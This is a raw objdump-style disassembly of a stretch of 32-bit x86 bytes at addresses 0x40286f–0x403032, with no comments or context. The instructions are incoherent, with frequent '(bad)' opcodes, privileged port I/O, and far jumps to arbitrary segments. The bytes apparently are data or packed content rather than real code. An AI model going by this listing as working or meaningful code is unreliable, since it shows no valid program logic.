  40286f:	mov    eax,ds:0x30bc8ec5
  402874:	and    al,0xc7
  402876:	xor    DWORD PTR [ebp+0x4462236e],ecx
  40287c:	(bad)  [edi-0x5b2568bd]
  402882:	ret    0xd4a5
  402885:	cmp    eax,DWORD PTR [ebp-0x61a042be]
  40288b:	jp     0x40287c
  40288d:	rcl    DWORD PTR [eax-0x36],1
  402890:	int3   
  402891:	aam    0x29
  402893:	mov    ebp,0x64f97d5b
  402898:	das    
  402899:	add    BYTE PTR [esp+ebp*8-0x5e],bl
  40289d:	fnstenvw [edx+0x36]
  4028a1:	sti    
  4028a2:	(bad)  
  4028a3:	xchg   ebp,eax
  4028a4:	push   0x801e2aec
  4028a9:	or     bl,BYTE PTR [ebx+ebx*1]
  4028ac:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  4028ae:	icebp  
  4028af:	push   cs
  4028b0:	xor    edi,ecx
  4028b2:	push   0xfd715bf3
  4028b7:	mov    ah,0x13
  4028b9:	int    0xd6
  4028bb:	les    edi,FWORD PTR [edi+0x8]
  4028be:	lea    esi,[ecx-0x55f5661e]
  4028c4:	in     eax,dx
  4028c5:	cmp    esp,esp
  4028c7:	xchg   ebx,eax
  4028c8:	(bad)  
  4028c9:	hlt    
  4028ca:	xchg   ecx,eax
  4028cb:	int    0x90
  4028cd:	xchg   esi,eax
  4028ce:	mov    edi,0x1cc1ff
  4028d3:	cwde   
  4028d4:	mov    ch,0xa4
  4028d6:	xchg   esp,eax
  4028d7:	cdq    
  4028d8:	out    dx,al
  4028d9:	in     eax,dx
  4028da:	cmp    ebp,DWORD PTR [eax-0x705340fa]
  4028e0:	xor    DWORD PTR [edx+ebp*2],esi
  4028e3:	test   eax,0x5b7a85f4
  4028e8:	ret    0xd7f4
  4028eb:	jl     0x40295d
  4028ed:	pop    ss
  4028ee:	mov    bh,0xc6
  4028f0:	xchg   ebp,eax
  4028f1:	pop    ecx
  4028f2:	sub    edx,DWORD PTR [ecx+0x245d7c53]
  4028f8:	mov    eax,ds:0x7e85482e
  4028fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4028fe:	mov    esi,0x1cdb7668
  402903:	push   0xffffffab
  402905:	jno    0x402919
  402907:	cmp    BYTE PTR [eax+0x35],dl
  40290a:	mov    esi,DWORD PTR [esi]
  40290c:	mov    cl,0xd5
  40290e:	or     eax,DWORD PTR [ecx+0x79]
  402911:	add    ebp,ebp
  402913:	or     edx,DWORD PTR [edx-0x61]
  402916:	dec    eax
  402917:	(bad)  
  402918:	out    0x94,eax
  40291a:	sbb    eax,0xb09683de
  40291f:	dec    edi
  402920:	and    al,0xdb
  402922:	inc    edi
  402923:	adc    eax,0x39b65914
  402928:	in     eax,0xcb
  40292a:	cmp    bh,BYTE PTR [ebx-0x7a]
  40292d:	call   0x9f44:0x8d57d846
  402934:	pusha  
  402935:	add    ah,ah
  402937:	inc    ebx
  402938:	loopne 0x402948
  40293a:	(bad)  
  40293b:	and    eax,0x21060bde
  402940:	aas    
  402941:	enter  0x23c7,0x88
  402945:	mov    edx,0x348abb16
  40294a:	xchg   ebx,eax
  40294b:	or     esi,DWORD PTR [edi+0x51a62f1c]
  402951:	call   0x7e39:0xb7608431
  402958:	add    eax,ebp
  40295a:	mov    bl,0x5a
  40295c:	inc    esi
  40295d:	mov    bh,0xd5
  40295f:	into   
  402960:	stc    
  402961:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402962:	cmp    eax,0xe51abe6
  402967:	(bad)  
  402969:	xor    al,0x50
  40296b:	nop
  40296c:	daa    
  40296d:	adc    esi,DWORD PTR [eax+0x3211e4e2]
  402973:	mov    edi,0xca044556
  402978:	ficom  DWORD PTR [esi+0x643ae9d7]
  40297e:	add    BYTE PTR [eax-0x209dcec2],cl
  402984:	stos   DWORD PTR es:[edi],eax
  402985:	sahf   
  402986:	xchg   edx,eax
  402987:	push   esp
  402988:	fldenv [ebx]
  40298a:	aam    0x83
  40298c:	xor    eax,DWORD PTR [eax]
  40298e:	int3   
  40298f:	out    dx,al
  402990:	ja     0x40292b
  402992:	xlat   BYTE PTR ds:[ebx]
  402993:	pop    ebx
  402994:	cmp    dl,BYTE PTR [esi+0x6cc4f36e]
  40299a:	inc    ecx
  40299b:	int3   
  40299c:	inc    ecx
  40299d:	jl     0x4029c3
  40299f:	mov    esp,0xb7cc09a6
  4029a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4029a5:	es retf 0xeed4
  4029a9:	pushf  
  4029aa:	cmp    dh,BYTE PTR [edi+0x5b]
  4029ad:	arpl   WORD PTR [eax-0x20],ax
  4029b0:	adc    DWORD PTR [ecx+0x2],ebp
  4029b3:	popa   
  4029b4:	repnz rcl cl,0xb5
  4029b8:	sbb    ch,BYTE PTR [edi+0x15434d8f]
  4029be:	xchg   edx,eax
  4029bf:	jecxz  0x4029ee
  4029c1:	pop    eax
  4029c2:	fiadd  DWORD PTR [ebp-0x57]
  4029c5:	scas   al,BYTE PTR es:[edi]
  4029c6:	mov    eax,0x6d6b7166
  4029cb:	jp     0x402a0e
  4029cd:	lea    edx,[edx+eax*4+0x637d97fb]
  4029d4:	call   0x6c8fecef
  4029d9:	push   ss
  4029da:	jno    0x402967
  4029dc:	cmp    dl,ah
  4029de:	inc    ebp
  4029df:	mov    ds:0xe7fa5fc1,al
  4029e4:	bound  esi,QWORD PTR [esi+ebx*8+0x70]
  4029e8:	xlat   BYTE PTR ds:[ebx]
  4029e9:	imul   ebp,DWORD PTR [esi],0x44
  4029ec:	inc    edx
  4029ed:	sbb    esp,edx
  4029ef:	outs   dx,BYTE PTR ds:[esi]
  4029f0:	std    
  4029f1:	jne    0x402a65
  4029f3:	cs pop ebp
  4029f5:	icebp  
  4029f6:	jb     0x4029a1
  4029f8:	outs   dx,BYTE PTR ds:[esi]
  4029f9:	sub    dl,cl
  4029fb:	push   eax
  4029fc:	jp     0x402a28
  4029fe:	test   DWORD PTR [eax+edx*1],edi
  402a01:	mov    dh,0x2b
  402a03:	fst    DWORD PTR [eax]
  402a05:	adc    BYTE PTR [ebp-0x418b1218],bh
  402a0b:	xor    ecx,ecx
  402a0d:	retf   0x5498
  402a10:	pop    ecx
  402a11:	cmp    cl,0x73
  402a14:	scas   eax,DWORD PTR es:[edi]
  402a15:	push   0x4c
  402a17:	mov    ebp,0x1d465d1b
  402a1c:	adc    eax,0x7143ad98
  402a21:	test   eax,0xcb36794f
  402a26:	adc    BYTE PTR [esi+0x3573cfac],dh
  402a2c:	xor    eax,0xcbe557e1
  402a31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402a32:	aas    
  402a33:	jne    0x4029f9
  402a35:	pop    es
  402a36:	rcl    DWORD PTR [eax+0x13],0x2a
  402a3a:	dec    edi
  402a3b:	dec    edi
  402a3c:	aas    
  402a3d:	fnstsw WORD PTR [edx]
  402a3f:	cwde   
  402a40:	push   edi
  402a41:	jae    0x402a03
  402a43:	jne    0x4029d5
  402a45:	(bad)  
  402a46:	mov    ebp,edi
  402a48:	mov    esi,0xbcd9abab
  402a4d:	(bad)  [ecx+0x4b]
  402a50:	cmp    BYTE PTR [edx+0x33],bl
  402a53:	jp     0x402acf
  402a55:	dec    edi
  402a56:	sti    
  402a57:	popf   
  402a58:	and    eax,0x7e123d15
  402a5d:	ins    BYTE PTR es:[edi],dx
  402a5e:	jge    0x402a16
  402a60:	mov    ebp,0xa9f2a516
  402a65:	fstp   QWORD PTR ds:0x1364c44c
  402a6b:	lock push esi
  402a6d:	int    0x3
  402a6f:	(bad)  
  402a70:	fidivr WORD PTR [ecx-0x838afef]
  402a76:	mov    esi,eax
  402a78:	popa   
  402a79:	sbb    dl,al
  402a7b:	or     bh,ch
  402a7d:	ret    
  402a7e:	out    dx,eax
  402a7f:	mov    ebx,0x20a0c950
  402a84:	xor    al,BYTE PTR [eax]
  402a86:	sti    
  402a87:	shl    BYTE PTR [eax],0xdb
  402a8a:	push   ecx
  402a8b:	xchg   ecx,eax
  402a8c:	sub    BYTE PTR [edx+0x4afcd0ac],al
  402a92:	adc    eax,0x67f87314
  402a97:	pop    esp
  402a98:	dec    eax
  402a99:	nop
  402a9a:	mov    cl,0x1
  402a9c:	push   ss
  402a9d:	(bad)  
  402a9e:	int3   
  402a9f:	dec    ebx
  402aa0:	and    DWORD PTR [ecx+0x30],ecx
  402aa3:	jne    0x402a25
  402aa5:	sbb    al,0x51
  402aa7:	pop    ebx
  402aa8:	sbb    ch,al
  402aaa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402aab:	addr16 call 0x926:0x54f23e9d
  402ab3:	clc    
  402ab4:	push   esp
  402ab5:	mov    esi,0xd1a5143b
  402aba:	fild   DWORD PTR [edx-0x14]
  402abd:	std    
  402abe:	lahf   
  402abf:	test   al,0x1f
  402ac1:	cmp    ah,BYTE PTR [eax]
  402ac3:	jo     0x402afa
  402ac5:	cmp    al,0xeb
  402ac7:	cmp    eax,0x18f64279
  402acc:	jecxz  0x402b28
  402ace:	call   0x95c5:0xbee5ac7f
  402ad5:	and    ebp,DWORD PTR [eax-0x74]
  402ad8:	cld    
  402ad9:	xchg   ebx,eax
  402ada:	daa    
  402adb:	enter  0x8748,0x37
  402adf:	add    al,0x5
  402ae1:	jbe    0x402a68
  402ae3:	mul    BYTE PTR [ecx-0x36999ecc]
  402ae9:	push   eax
  402aea:	inc    ecx
  402aeb:	jmp    0x9c9aa1cb
  402af0:	fstp   QWORD PTR [ebp-0x34]
  402af3:	jle    0x402a75
  402af5:	add    dl,0x7e
  402af8:	add    bh,bl
  402afa:	je     0x402b1e
  402afc:	in     al,dx
  402afd:	inc    edx
  402afe:	xchg   esi,eax
  402aff:	sub    DWORD PTR [edi-0x5a79dac],edi
  402b05:	sbb    dh,BYTE PTR [ebx]
  402b07:	xor    DWORD PTR [eax],0x74
  402b0a:	jp     0x402b59
  402b0c:	jno    0x402b5c
  402b0e:	push   es
  402b0f:	lahf   
  402b10:	les    eax,FWORD PTR [ebx]
  402b12:	int3   
  402b13:	mov    al,0x90
  402b15:	sub    eax,0x7c539b2b
  402b1a:	mov    eax,0x1754585a
  402b1f:	out    dx,al
  402b20:	jmp    0x7121:0x36ddf603
  402b27:	hlt    
  402b28:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402b29:	dec    esp
  402b2a:	ret    
  402b2b:	and    eax,0xf728ae5e
  402b30:	dec    esp
  402b31:	adc    esp,ebp
  402b33:	(bad)  
  402b34:	xor    eax,0x3880c68a
  402b39:	mov    bh,0x2c
  402b3b:	sar    DWORD PTR [esi+0x4d8b2e0e],0xa7
  402b42:	loop   0x402ac5
  402b44:	lods   al,BYTE PTR ds:[esi]
  402b45:	call   DWORD PTR [eax-0x7e]
  402b48:	push   esp
  402b49:	popf   
  402b4a:	add    DWORD PTR [eax],esi
  402b4c:	(bad)  
  402b4d:	cli    
  402b4e:	addr16 jb 0x402b96
  402b51:	xchg   al,ah
  402b53:	jne    0x402b9e
  402b55:	dec    DWORD PTR [ebp+eiz*4+0x56]
  402b59:	add    al,0x2a
  402b5b:	mov    BYTE PTR [ecx+ebp*8-0x2aaede98],ah
  402b62:	out    dx,al
  402b63:	popa   
  402b64:	adc    BYTE PTR [esi],cl
  402b66:	cmp    eax,0x8acc27b7
  402b6b:	mov    dl,0x9c
  402b6d:	mov    dh,cl
  402b6f:	pop    ss
  402b70:	xchg   DWORD PTR [esi-0x27],ebp
  402b73:	cmp    cl,cl
  402b75:	call   0xd99833a0
  402b7a:	cmovle eax,DWORD PTR [ebx+0x55]
  402b7e:	mov    ecx,0xa98d9c16
  402b83:	cmp    bl,dl
  402b85:	ds jl  0x402b0d
  402b88:	mov    ebx,0xe05ec694
  402b8d:	or     ebp,ebx
  402b8f:	mov    ah,0x5d
  402b91:	fadd   DWORD PTR [edx]
  402b93:	arpl   bp,di
  402b95:	or     ecx,DWORD PTR [edx+0x58011693]
  402b9b:	ja     0x402c06
  402b9d:	lahf   
  402b9e:	je     0x402b32
  402ba0:	fdivr  DWORD PTR [edi-0x3424d34f]
  402ba6:	xor    DWORD PTR [ebp-0x2f6f287],ebx
  402bac:	and    DWORD PTR [esi+0x37],0x4fd848e4
  402bb3:	lds    edi,FWORD PTR [esi-0x6]
  402bb6:	ins    DWORD PTR es:[edi],dx
  402bb7:	sub    BYTE PTR [edi+0x57],bh
  402bba:	pop    ds
  402bbb:	or     eax,0x582d0d9f
  402bc0:	int    0xea
  402bc2:	inc    esp
  402bc3:	or     al,0xef
  402bc5:	lds    eax,FWORD PTR [ebp+edx*8+0x5a]
  402bc9:	cwde   
  402bca:	cdq    
  402bcb:	imul   edx,DWORD PTR [ecx],0xffffff82
  402bce:	cli    
  402bcf:	ins    DWORD PTR es:[edi],dx
  402bd0:	xlat   BYTE PTR ds:[ebx]
  402bd1:	xchg   edx,eax
  402bd2:	call   0xa13c5238
  402bd7:	call   0x923aaf4e
  402bdc:	add    DWORD PTR ds:0x7af5ec55,edi
  402be2:	add    al,0x34
  402be4:	retf   0x8efe
  402be7:	loopne 0x402b9a
  402be9:	cwde   
  402bea:	ret    0xf91b
  402bed:	ds push cs
  402bef:	jbe    0x402c3f
  402bf1:	outs   dx,BYTE PTR ds:[esi]
  402bf2:	mov    dh,0xb6
  402bf4:	mov    ds:0xf2e11507,eax
  402bf9:	into   
  402bfa:	add    edi,esp
  402bfc:	scas   al,BYTE PTR es:[edi]
  402bfd:	xchg   edi,eax
  402bfe:	push   eax
  402bff:	jns    0x402bfb
  402c01:	hlt    
  402c02:	xor    DWORD PTR [ebx-0x8],0xd7e8b5ff
  402c09:	pusha  
  402c0a:	xchg   edi,eax
  402c0b:	jno    0x402c85
  402c0d:	mov    cs,WORD PTR [esi-0x79]
  402c10:	pushf  
  402c11:	cmp    dh,BYTE PTR [ebp+0x78]
  402c14:	mov    ebp,0x85f6f4b0
  402c19:	adc    BYTE PTR [ebp-0x58],bh
  402c1c:	test   BYTE PTR [esi+0x132e106e],bl
  402c22:	(bad)  
  402c23:	xchg   ebp,eax
  402c24:	xchg   ebx,eax
  402c25:	add    eax,0xfba767f0
  402c2a:	push   es
  402c2b:	mov    bh,0xfb
  402c2d:	in     eax,dx
  402c2e:	sub    eax,0x28754988
  402c33:	imul   ebp,DWORD PTR [esi-0x6d],0x95ba5bda
  402c3a:	xchg   ecx,eax
  402c3b:	mov    esp,0xdf94499e
  402c40:	dec    ebx
  402c41:	(bad)  
  402c42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402c43:	sub    al,0xf0
  402c45:	dec    eax
  402c46:	or     al,0x2
  402c48:	sbb    eax,0xc6c0c7
  402c4d:	xor    DWORD PTR [eax+0x6f],eax
  402c50:	nop
  402c51:	inc    ecx
  402c52:	mov    ds:0x85077bbd,al
  402c57:	xlat   BYTE PTR ds:[ebx]
  402c58:	or     edx,esi
  402c5a:	inc    esi
  402c5b:	les    esp,FWORD PTR [edi-0x295f4058]
  402c61:	sub    DWORD PTR [esi+0x46fc3193],ebx
  402c67:	mov    BYTE PTR [eax],dl
  402c69:	hlt    
  402c6a:	push   edx
  402c6b:	jno    0x402c74
  402c6d:	dec    ecx
  402c6e:	inc    esp
  402c6f:	ss loop 0x402c86
  402c72:	sbb    cl,BYTE PTR [ebp-0x22]
  402c75:	popf   
  402c76:	les    esi,FWORD PTR [eax-0x4de1d093]
  402c7c:	es mov dh,0x77
  402c7f:	lea    eax,[edi]
  402c81:	inc    edx
  402c82:	xchg   ecx,eax
  402c83:	enter  0xf2b9,0xb1
  402c87:	mov    ebx,fs
  402c89:	(bad)  
  402c8a:	pop    edi
  402c8b:	jmp    0x402c92
  402c8d:	dec    BYTE PTR [eax+0x6a00d303]
  402c93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402c94:	dec    esi
  402c95:	pop    es
  402c96:	add    dh,bl
  402c98:	sub    esi,DWORD PTR [eax+0x1dc259b3]
  402c9e:	popa   
  402c9f:	sub    esi,DWORD PTR [esi-0x26]
  402ca2:	inc    edi
  402ca3:	idiv   BYTE PTR ds:0xb8211ac
  402ca9:	xchg   edi,eax
  402caa:	sbb    DWORD PTR [ebx],edi
  402cac:	sub    ebx,eax
  402cae:	call   0x856c:0x36a74321
  402cb5:	cmp    DWORD PTR [edx-0x8],eax
  402cb8:	mov    WORD PTR [ebx],es
  402cba:	and    al,0x1e
  402cbc:	inc    ebp
  402cbd:	cli    
  402cbe:	(bad)  
  402cbf:	sbb    esi,DWORD PTR [ebx+ecx*8-0x1e0b4a09]
  402cc6:	test   al,0xeb
  402cc8:	loop   0x402d02
  402cca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402ccb:	and    BYTE PTR [eax],ah
  402ccd:	shl    DWORD PTR [edi],0xe3
  402cd0:	mov    edi,0xbc1d57a5
  402cd5:	sub    bh,BYTE PTR [ebx]
  402cd7:	imul   edi,DWORD PTR [ebx-0x44],0x8fdb0a92
  402cde:	pusha  
  402cdf:	(bad)  
  402ce0:	les    edi,FWORD PTR [esi+0x91b5c78]
  402ce6:	sahf   
  402ce7:	repz pop eax
  402ce9:	imul   ecx,DWORD PTR [esi],0x4a99cb16
  402cef:	adc    eax,DWORD PTR [ecx+eax*8]
  402cf2:	inc    ebp
  402cf3:	or     dl,BYTE PTR [edx]
  402cf5:	xchg   esi,eax
  402cf6:	test   DWORD PTR [edx-0x232e395f],eax
  402cfc:	jo     0x402d06
  402cfe:	or     ah,ch
  402d00:	hlt    
  402d01:	shrd   DWORD PTR [edi],eax,0x71
  402d05:	inc    ecx
  402d06:	bound  ecx,QWORD PTR [edx+0x4672b538]
  402d0c:	mov    cs,WORD PTR [edi+0x47]
  402d0f:	or     al,0xc1
  402d11:	ja     0x402d85
  402d13:	sbb    BYTE PTR [esp+ecx*1+0x8],0xc5
  402d18:	call   0xb5524262
  402d1d:	dec    esp
  402d1e:	pushf  
  402d1f:	test   DWORD PTR [ecx-0x26],edi
  402d22:	push   eax
  402d23:	xchg   ecx,eax
  402d24:	neg    DWORD PTR [edi]
  402d26:	mov    DWORD PTR ds:0x78ebdfac,eax
  402d2c:	ins    DWORD PTR es:[edi],dx
  402d2d:	sbb    BYTE PTR [eax+0x6f9da21b],cl
  402d33:	cmp    eax,0xfafe731c
  402d38:	cmp    eax,0xd48990bb
  402d3d:	repnz mov BYTE PTR [esi+0x253f0b6],ah
  402d44:	ret    0xaf75
  402d47:	xchg   DWORD PTR [edi],ecx
  402d49:	dec    ecx
  402d4a:	mov    BYTE PTR [ebx+ebp*8+0x1fae6bd],ch
  402d51:	mov    ebp,0xeb65f082
  402d56:	lods   eax,DWORD PTR ds:[esi]
  402d57:	fmulp  st(3),st
  402d59:	xchg   ecx,eax
  402d5a:	std    
  402d5b:	inc    eax
  402d5c:	jge    0x402ddb
  402d5e:	loopne 0x402d8e
  402d60:	fucomip st,st(6)
  402d62:	pop    ecx
  402d63:	push   edi
  402d64:	dec    esp
  402d65:	sub    al,0x20
  402d68:	pop    eax
  402d69:	add    bl,dl
  402d6b:	mov    WORD PTR [edx+0x33],ss
  402d6e:	icebp  
  402d6f:	cmp    bh,BYTE PTR [ecx-0x3ad3e0e9]
  402d75:	jns    0x402d6c
  402d77:	mov    ch,0x95
  402d79:	xor    al,0x25
  402d7b:	inc    si
  402d7d:	fwait
  402d7e:	cvtpi2ps xmm1,QWORD PTR [edi-0x20fb7c7]
  402d85:	jo     0x402d92
  402d87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402d88:	push   ds
  402d89:	sbb    al,BYTE PTR [ebx+0x5a]
  402d8c:	(bad)  
  402d8d:	ror    BYTE PTR [edi],1
  402d8f:	clc    
  402d90:	dec    esi
  402d91:	pop    ds
  402d92:	pop    ds
  402d93:	in     al,0xb6
  402d95:	sti    
  402d96:	inc    ebp
  402d97:	jp     0x402d24
  402d99:	mov    edi,0x1a1c408f
  402d9e:	xor    al,BYTE PTR [esi]
  402da0:	or     BYTE PTR [edi+0x57],ch
  402da3:	scas   al,BYTE PTR es:[edi]
  402da4:	cli    
  402da5:	mov    bh,0xb1
  402da7:	mov    eax,DWORD PTR [edx+0x67fc99e1]
  402dad:	xor    DWORD PTR [eax-0x61f65f4a],0xffffffc3
  402db4:	jb     0x402d9c
  402db6:	(bad)
  402db9:	push   ecx
  402dba:	push   esi
  402dbb:	push   cs
  402dbc:	aaa    
  402dbd:	call   0x9bd:0x9b09ea0b
  402dc4:	popf   
  402dc5:	out    dx,eax
  402dc6:	dec    ecx
  402dc7:	cmpxchg DWORD PTR [esi],esi
  402dca:	cmc    
  402dcb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402dcc:	add    BYTE PTR [edx-0x5f0c89d6],0xde
  402dd3:	shl    BYTE PTR [ebp+ecx*1+0x78],1
  402dd7:	popf   
  402dd8:	xchg   BYTE PTR [edi+0x58aa068f],ah
  402dde:	mov    esp,0xea0389af
  402de3:	into   
  402de4:	imul   edx,DWORD PTR [edi-0x74],0x4a
  402de8:	stos   BYTE PTR es:[edi],al
  402de9:	jp     0x402dd4
  402deb:	mov    esp,DWORD PTR [esi]
  402ded:	loop   0x402def
  402def:	repz mov ds:0xe3d16cf,al
  402df5:	and    al,0x79
  402df7:	dec    eax
  402df8:	xor    al,0x65
  402dfa:	mov    ch,0x31
  402dfc:	jno    0x402e12
  402dfe:	(bad)  
  402e00:	ret    
  402e01:	idiv   BYTE PTR [ecx-0xaee0d8a]
  402e07:	or     bl,BYTE PTR [ebp-0xf3852d]
  402e0d:	or     al,0xd8
  402e0f:	jbe    0x402e90
  402e11:	arpl   WORD PTR [edx-0xb2e887d],bx
  402e17:	mov    edi,0x1cfc640c
  402e1c:	jl     0x402db9
  402e1e:	jmp    0x13cf:0xd80b5aec
  402e25:	aam    0x84
  402e27:	ror    BYTE PTR ds:0x60d3aa21,1
  402e2d:	adc    esp,DWORD PTR [eax-0x71b748fa]
  402e33:	out    0x50,al
  402e35:	and    al,0x92
  402e37:	scas   al,BYTE PTR es:[edi]
  402e38:	out    dx,al
  402e39:	ds arpl si,dx
  402e3c:	push   cs
  402e3d:	xor    al,0x50
  402e3f:	mov    ah,0x8d
  402e41:	or     ebx,DWORD PTR [edx-0x24]
  402e44:	xchg   edx,eax
  402e45:	ja     0x402ebc
  402e47:	xchg   DWORD PTR [edi],ebp
  402e49:	outs   dx,DWORD PTR ds:[esi]
  402e4a:	je     0x402e7d
  402e4c:	dec    ebx
  402e4d:	pop    ss
  402e4e:	mov    ecx,0x595fc838
  402e53:	out    0xa7,al
  402e55:	sahf   
  402e56:	lods   al,BYTE PTR ds:[esi]
  402e57:	dec    esp
  402e58:	add    DWORD PTR [ebx+0x454cdbec],ecx
  402e5e:	inc    edi
  402e5f:	(bad)  
  402e60:	stc    
  402e61:	aam    0x3f
  402e63:	push   0xee79155e
  402e68:	and    ebp,DWORD PTR [edi]
  402e6a:	lea    edx,ds:0xd18b983d
  402e70:	lock or ebp,eax
  402e73:	cs mov ah,0x46
  402e76:	mov    ecx,0xbecf2bc
  402e7b:	mov    dl,ch
  402e7d:	out    0x97,eax
  402e7f:	ss (bad) 
  402e81:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402e82:	mov    WORD PTR [ebx+0xe],?
  402e85:	and    BYTE PTR [ecx+0x3d],0x37
  402e89:	cmp    ebp,DWORD PTR [edi-0x61]
  402e8c:	cli    
  402e8d:	jmp    0x94f4:0x5a7da915
  402e94:	outs   dx,BYTE PTR ds:[esi]
  402e95:	popf   
  402e96:	inc    edi
  402e97:	xchg   esp,eax
  402e98:	xchg   DWORD PTR [esi+0x3c],edi
  402e9b:	(bad)  
  402e9c:	mov    ?,WORD PTR [esi+0x5ee968a]
  402ea2:	add    edx,DWORD PTR [ebx]
  402ea4:	call   0x20d2:0xf7009522
  402eab:	daa    
  402eac:	in     eax,dx
  402ead:	mov    al,0x20
  402eaf:	xchg   ebp,eax
  402eb0:	test   eax,0xc4d01ff6
  402eb5:	dec    esp
  402eb6:	xadd   DWORD PTR [edi],ebp
  402eb9:	jp     0x402e50
  402ebb:	pop    edx
  402ebc:	out    dx,al
  402ebd:	pop    ebp
  402ebe:	(bad)  
  402ebf:	lahf   
  402ec0:	xlat   BYTE PTR ds:[ebx]
  402ec1:	in     eax,dx
  402ec2:	pusha  
  402ec3:	jns    0x402eed
  402ec5:	pop    ecx
  402ec6:	or     DWORD PTR [ebx-0x42],ecx
  402ec9:	test   BYTE PTR [ebx-0x27b272de],0x2e
  402ed0:	into   
  402ed1:	sbb    ebp,DWORD PTR [eax+0x4cf504d6]
  402ed7:	xor    esi,DWORD PTR [edi+0x2417aa3b]
  402edd:	int3   
  402ede:	xor    esp,DWORD PTR [ecx-0x58]
  402ee1:	dec    esp
  402ee2:	lahf   
  402ee3:	push   esi
  402ee4:	outs   dx,BYTE PTR ds:[esi]
  402ee5:	or     edx,edi
  402ee7:	call   0x993c:0xa7faf34b
  402eee:	imul   edi,DWORD PTR [ebx],0xffffffb0
  402ef1:	push   ss
  402ef2:	mov    ebp,0x69f53fdc
  402ef7:	jmp    0x14bfc7fd
  402efc:	fwait
  402efd:	les    esp,FWORD PTR [esi-0x7c638eab]
  402f03:	rcl    edi,0x12
  402f06:	ror    DWORD PTR [esi-0xa311e65],0x4d
  402f0d:	test   al,0x82
  402f0f:	xor    DWORD PTR [ebp+0x7f],esi
  402f12:	cs imul eax,eax,0x88381ad6
  402f19:	fwait
  402f1a:	cmc    
  402f1b:	cdq    
  402f1c:	mov    dh,0xa9
  402f1e:	mov    cl,0x5b
  402f20:	jns    0x402ea3
  402f22:	ret    0xdb87
  402f25:	scas   al,BYTE PTR es:[edi]
  402f26:	sbb    BYTE PTR [eax-0x1c],dh
  402f29:	(bad)  
  402f2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402f2b:	hlt    
  402f2c:	lods   al,BYTE PTR ds:[esi]
  402f2d:	retf   
  402f2e:	xchg   dl,ch
  402f30:	jle    0x402f2e
  402f32:	jp     0x402f6b
  402f34:	fidivr DWORD PTR [edi]
  402f36:	mov    esi,0x14a95e83
  402f3b:	or     al,0xb4
  402f3d:	rol    BYTE PTR [edi],0xd6
  402f40:	das    
  402f41:	cmp    eax,0x5373e3a9
  402f46:	jae    0x402f89
  402f48:	sti    
  402f49:	mov    bh,0x80
  402f4b:	in     eax,dx
  402f4c:	lods   eax,DWORD PTR ds:[esi]
  402f4d:	push   ecx
  402f4e:	leave  
  402f4f:	mov    edi,0x75ae3a68
  402f54:	add    ebx,DWORD PTR [ebx+0x3517fa3d]
  402f5a:	inc    ecx
  402f5b:	sbb    esi,ebx
  402f5d:	push   edx
  402f5e:	dec    ecx
  402f5f:	jge    0x402ee5
  402f61:	inc    edi
  402f62:	pushf  
  402f63:	mov    WORD PTR [eax],ss
  402f65:	inc    ebx
  402f66:	mov    ds:0x2bc7315c,al
  402f6b:	ss dec ebp
  402f6d:	push   0x64b3b06b
  402f72:	sbb    esp,DWORD PTR [edi-0x1e]
  402f75:	mov    edi,0x532e547f
  402f7a:	mov    ah,0x40
  402f7c:	icebp  
  402f7d:	mov    ds:0xf2881b25,eax
  402f82:	jmp    0xdecd:0x561bad39
  402f89:	pop    esi
  402f8a:	cmp    DWORD PTR [eax-0xab064b1],0x51
  402f91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402f92:	nop
  402f93:	sbb    eax,0x9acab77f
  402f98:	in     eax,dx
  402f99:	jl     0x403011
  402f9b:	add    esp,DWORD PTR [ecx]
  402f9d:	xor    eax,0x4d009a06
  402fa2:	dec    esp
  402fa3:	mov    esp,DWORD PTR [edx-0x2ee1fc6b]
  402fa9:	add    DWORD PTR [ebp+0x6848fce5],edi
  402faf:	adc    ecx,0xb363457e
  402fb5:	add    DWORD PTR [ebp+0x26],eax
  402fb8:	mul    BYTE PTR ds:0x787f38b
  402fbe:	mov    cl,0xd6
  402fc0:	sub    BYTE PTR [eax-0x67],bh
  402fc3:	adc    ecx,DWORD PTR [ecx]
  402fc5:	push   esp
  402fc6:	add    ebx,edx
  402fc8:	mov    ds:0xdb3ebfb4,al
  402fcd:	lods   al,BYTE PTR ds:[esi]
  402fce:	push   es
  402fcf:	and    bh,BYTE PTR [eax+0x7b120d83]
  402fd5:	sub    BYTE PTR ds:0xd9b3439d,ch
  402fdb:	dec    ebx
  402fdc:	pop    edx
  402fdd:	jns    0x403018
  402fdf:	pop    es
  402fe0:	enter  0xf60a,0x30
  402fe4:	test   BYTE PTR [eax-0x77],al
  402fe7:	adc    dh,dl
  402fe9:	push   ebp
  402fea:	cmp    BYTE PTR [ebx-0x45b084fc],dl
  402ff0:	hlt    
  402ff1:	pop    esi
  402ff2:	dec    ecx
  402ff3:	ss xchg esi,eax
  402ff5:	cdq    
  402ff6:	mov    eax,0x1d04fe27
  402ffb:	and    BYTE PTR [ebx],cl
  402ffd:	sub    al,BYTE PTR [esp+eiz*8]
  403000:	dec    eax
  403001:	test   al,0xd
  403003:	pop    eax
  403004:	sbb    al,0x18
  403006:	call   0x36c80000
  40300b:	arpl   WORD PTR [eax+0x32],di
  40300e:	and    eax,0x1371fa33
  403013:	test   eax,0xa70ca1da
  403018:	cmp    DWORD PTR [edi],eax
  40301a:	mov    esp,ds
  40301c:	cwde   
  40301d:	add    BYTE PTR [edi+0x2c],ch
  403020:	imul   BYTE PTR [ecx]
  403022:	cmp    eax,0x4a3a8e8c
  403027:	dec    esi
  403028:	pop    ss
  403029:	test   BYTE PTR [edi-0x38],al
  40302c:	or     bh,BYTE PTR [esi-0x56]
  40302f:	ret    0x8279
  403032:	xor    edi,DWORD PTR [ebx+0x46]
